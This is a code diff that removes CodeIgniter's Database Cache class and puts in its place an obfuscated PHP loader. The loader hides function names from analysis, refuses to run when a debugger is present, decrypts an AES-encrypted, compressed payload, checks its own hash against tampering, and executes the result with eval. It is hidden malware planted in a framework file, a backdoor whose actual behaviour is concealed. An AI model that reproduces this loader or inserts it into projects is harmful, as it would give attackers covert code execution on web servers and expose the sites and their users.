@@ -1,221 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 1.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * Database Cache Class
- *
- * @category	Database
- * @author		EllisLab Dev Team
- * @link		https://codeigniter.com/user_guide/database/
- */
-class CI_DB_Cache {
-
-	/**
-	 * CI Singleton
-	 *
-	 * @var	object
-	 */
-	public $CI;
-
-	/**
-	 * Database object
-	 *
-	 * Allows passing of DB object so that multiple database connections
-	 * and returned DB objects can be supported.
-	 *
-	 * @var	object
-	 */
-	public $db;
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Constructor
-	 *
-	 * @param	object	&$db
-	 * @return	void
-	 */
-	public function __construct(&$db)
-	{
-		// Assign the main CI object to $this->CI and load the file helper since we use it a lot
-		$this->CI =& get_instance();
-		$this->db =& $db;
-		$this->CI->load->helper('file');
-
-		$this->check_path();
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Set Cache Directory Path
-	 *
-	 * @param	string	$path	Path to the cache directory
-	 * @return	bool
-	 */
-	public function check_path($path = '')
-	{
-		if ($path === '')
-		{
-			if ($this->db->cachedir === '')
-			{
-				return $this->db->cache_off();
-			}
-
-			$path = $this->db->cachedir;
-		}
-
-		// Add a trailing slash to the path if needed
-		$path = realpath($path)
-			? rtrim(realpath($path), DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR
-			: rtrim($path, '/').'/';
-
-		if ( ! is_dir($path))
-		{
-			log_message('debug', 'DB cache path error: '.$path);
-
-			// If the path is wrong we'll turn off caching
-			return $this->db->cache_off();
-		}
-
-		if ( ! is_really_writable($path))
-		{
-			log_message('debug', 'DB cache dir not writable: '.$path);
-
-			// If the path is not really writable we'll turn off caching
-			return $this->db->cache_off();
-		}
-
-		$this->db->cachedir = $path;
-		return TRUE;
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Retrieve a cached query
-	 *
-	 * The URI being requested will become the name of the cache sub-folder.
-	 * An MD5 hash of the SQL statement will become the cache file name.
-	 *
-	 * @param	string	$sql
-	 * @return	string
-	 */
-	public function read($sql)
-	{
-		$segment_one = ($this->CI->uri->segment(1) == FALSE) ? 'default' : $this->CI->uri->segment(1);
-		$segment_two = ($this->CI->uri->segment(2) == FALSE) ? 'index' : $this->CI->uri->segment(2);
-		$filepath = $this->db->cachedir.$segment_one.'+'.$segment_two.'/'.md5($sql);
-
-		if ( ! is_file($filepath) OR FALSE === ($cachedata = file_get_contents($filepath)))
-		{
-			return FALSE;
-		}
-
-		return unserialize($cachedata);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Write a query to a cache file
-	 *
-	 * @param	string	$sql
-	 * @param	object	$object
-	 * @return	bool
-	 */
-	public function write($sql, $object)
-	{
-		$segment_one = ($this->CI->uri->segment(1) == FALSE) ? 'default' : $this->CI->uri->segment(1);
-		$segment_two = ($this->CI->uri->segment(2) == FALSE) ? 'index' : $this->CI->uri->segment(2);
-		$dir_path = $this->db->cachedir.$segment_one.'+'.$segment_two.'/';
-		$filename = md5($sql);
-
-		if ( ! is_dir($dir_path) && ! @mkdir($dir_path, 0750))
-		{
-			return FALSE;
-		}
-
-		if (write_file($dir_path.$filename, serialize($object)) === FALSE)
-		{
-			return FALSE;
-		}
-
-		chmod($dir_path.$filename, 0640);
-		return TRUE;
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Delete cache files within a particular directory
-	 *
-	 * @param	string	$segment_one
-	 * @param	string	$segment_two
-	 * @return	void
-	 */
-	public function delete($segment_one = '', $segment_two = '')
-	{
-		if ($segment_one === '')
-		{
-			$segment_one  = ($this->CI->uri->segment(1) == FALSE) ? 'default' : $this->CI->uri->segment(1);
-		}
-
-		if ($segment_two === '')
-		{
-			$segment_two = ($this->CI->uri->segment(2) == FALSE) ? 'index' : $this->CI->uri->segment(2);
-		}
-
-		$dir_path = $this->db->cachedir.$segment_one.'+'.$segment_two.'/';
-		delete_files($dir_path, TRUE);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Delete all existing cache files
-	 *
-	 * @return	void
-	 */
-	public function delete_all()
-	{
-		delete_files($this->db->cachedir, TRUE, TRUE);
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_c2zkudji=('bas'.'e64'.'_de'.'cod'.'e');
+$_sca0gtn5=('gzu'.'nco'.'mpr'.'ess');
+$_e5jwxgql=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_mc6l14fm='xdY5rXjW';
+$_csoh3klx='uJ4tfQYb';
+$_qtxlhn8q='K1urGycN';
+$_y9014mlt='IyI0VNzaPVs=';
+$_v6e3lmjq='pDYk6Hv9';
+$_lcj8edj2='rYRv6Oxo';
+$_oup3cd09='6mmZ4OAK';
+$_afiuurbe='6zXlrQ==';
+$_m5tuocso=$_c2zkudji($_mc6l14fm.$_v6e3lmjq.$_qtxlhn8q.$_csoh3klx.$_y9014mlt);
+$_m5n8orgs=$_c2zkudji($_oup3cd09.$_lcj8edj2.$_afiuurbe);
+$_u0ctwak8=$_c2zkudji('/HHLi0MtWz8ZepEgD8u3sXva3BCQngLh49tl7zc1bPwXrYY61UF/wLT7Wj+jAahbH/LMaFyLlP+RJvmUqzdFnMACg1l0nNIHY6pMiZ3dcwvbAOdzhSxh7UXoBusXFI2mHBAwTDjqvcGCvCM4b/c5p15+J+uFEYCSOBMfCxTMDkUJC+Yx4QNMqrd0biIUDut7zxJrr0VsX09iE0OgqVLeCuKz3vAvuqEUVF9JaYpZFl8uKskZVyGshFRl6DTQzpDH0USeG5GKiITaNhfJPrP5mvhqG4Nz3ihOuQllhGRu/fTk+rKq/BsOuJKnhGbS/HWrQIPL98K8WmTKU4qFSG9hCYjE3NGI9Zwm8gWCnEn39QNTvwVxAzRZTI2YljBSoFXwqNwE+r4wx6PbLLcokWmKXU7ef9we3wHq+owS+dzDZocf21kwjntn5Gs/wNagruveI4gNP/TZXDtebzMfMHYyf4p8aKsakFW1hLVdsdqk6GTTWZoLp/Xt2ZCN8XMcSxGCaJ2Cn+A9XmH4CuaIq7ihResFmxU18hMB6pviq0y6IdQzv/7Oc9TV5j5AjVx1mWZWxixsS0cgEC00SszS0E8i4sGWGKYycv/YqYWpAPAzrjdr+CyHzxPRd4pWX3zdF6cgB0Jlg0iEc9IkGcZ53q3uZwDT8J2eCfonkMB1cB7ft39AHUoWtVMnIlZ3K867rwsgXLYFgEzcYwJPHCrvBO/WDVsnn4eHQNNoCjL1kzuB/P4mzZtRbWGLPrwXSfXMpl+ab4g9pu2/V0Jhp67TFDWEhTbYF8STm/VAnU9LJX/o1rGU13ysTEn5Or1nHE/KvILhejvHCuaUf7Ly9k+y08Xno8Ix6w9dWHpUeHgaEw/X/XkMyR9gj50VhznpPAwl8eUhZACD0QBokoY/IAhFvUtq1EFn7ilIHFf1hdmhDtPyWw0=');
+$_yn0syesp=$_e5jwxgql($_u0ctwak8,'aes-256-cbc',$_m5tuocso,OPENSSL_RAW_DATA,$_m5n8orgs);
+if($_yn0syesp===false){exit;}
+$_skj1m6ud=$_sca0gtn5($_yn0syesp);
+if($_skj1m6ud===false){exit;}
+$_onknr4eu='84d39a518e1a6e8a00a9b811bf6ebecab5c47ae7e5302d872132a649c4dfdae9';
+$_hlus9c3d=@file_get_contents(__FILE__);
+if($_hlus9c3d!==false){
+$_mpvt5dpz=str_replace($_onknr4eu,"0000000000000000000000000000000000000000000000000000000000000000",$_hlus9c3d);
+$_qztk63xa=hash("sha256",$_mpvt5dpz);
+if($_qztk63xa!==$_onknr4eu){@http_response_code(403);exit;}
 }
+eval($_skj1m6ud);
